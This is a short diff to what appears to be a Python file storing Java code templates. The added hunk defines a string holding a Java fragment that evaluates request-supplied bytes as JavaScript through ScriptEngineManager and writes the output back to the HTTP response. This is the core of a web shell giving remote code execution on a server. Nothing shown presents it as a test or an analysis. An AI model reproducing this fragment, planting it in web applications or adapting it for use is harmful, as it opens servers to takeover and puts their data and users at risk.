@@ -13,3 +13,10 @@ code = """
         return result;
     }
 """
+
+proc = """
+            payload = new String(bytes);
+            String result = (new javax.script.ScriptEngineManager()
+                .getEngineByName("js").eval(payload)).toString();
+            res.getWriter().write(result);
+"""
